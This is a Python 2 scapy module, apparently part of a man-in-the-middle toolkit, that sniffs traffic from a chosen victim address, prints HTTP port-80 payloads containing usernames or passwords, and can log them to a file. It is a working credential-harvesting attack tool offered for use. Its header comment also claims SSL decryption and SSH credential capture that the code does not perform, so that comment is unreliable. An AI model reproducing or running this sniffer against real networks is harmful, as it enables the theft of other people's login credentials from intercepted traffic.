import stream
from scapy.all import *
from threading import Thread

#
# Module sniffs poisoned traffic for passwords, essentially just parsing payloads for the USERNAME or PASSWORD
# flag.  Also decrypts SSL traffic so we can snag SSH credentials.
#
class PasswordSniffer:
	def __init__(self):
		self.source = None
		self.sniff = False
		self.dump_data = False
		# do we want to log passwords to a pot?
		self.log_data = False
		self.log_file = None

	#
	# The only applied filter for the sniffer is the source address; the rest is fair game for parsing
	#
	def traffic_sniffer(self):
		sniff(filter="src %s"%self.source, store=0,prn=self.dump, stopper=self.stop_callback, stopperTimeout=3)

	#
	# initialize the sniffer
	#
	def initialize(self):
		self.source = raw_input('[!] Enter address to sniff passwords from: ')
		tmp = raw_input('[!] Sniff passwords from %s.  Is this correct? '%self.source)
		if tmp == 'n':
			return None
		self.sniff = True
		sniff_thread = Thread(target=self.traffic_sniffer)
		sniff_thread.start()
		return self.source

	#
	# Shutdown the password sniffer
	#
	def shutdown(self):
		if self.sniff:
			self.sniff = False
		print '[dbg] password sniffer shutting down'
		return True

	#
	# loop a logger for the user, and catch a control+c when they're done
	#
	def view (self):
		try:
			while True:
				self.dump_data = True
		except KeyboardInterrupt:
			self.dump_data = False
			return

	#
	# Parse packet payloads for username/passwords
	#
	def dump(self, pkt):
		if self.dump_data:
			# http
			if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
				payload = pkt.getlayer(Raw).load
				if 'username' in payload or 'password' in payload:
					print payload
					if self.log_data:
						self.log_file.write(str(payload))
			# TODO: ssh, smb(?), other protos....

	#
	# stop the password sniffer
	#
	def stop_callback(self):
		if self.sniff:
			return False
		print '[dbg] password sniffer shutdown'
		return True

	#
	#
	#
	def log(self, opt, log_loc):
		if opt and not self.log_data:
			try:
				print '[dbg] starting logger..'
				self.log_file = open(log_loc, 'w+')
			except Exception, j:
				print '[-] Error opening log file: ', j
				self.log_file = None
				return
			self.log_data = True
		elif not opt and self.log_data:
			try:
				self.log_file.close()
				self.log_file = None
				self.log_data = False
				print '[dbg] Logger shutdown completed.'
			except Exception, j:
				print '[dbg] Error closing logger: ', j
				self.log_data = False
				return
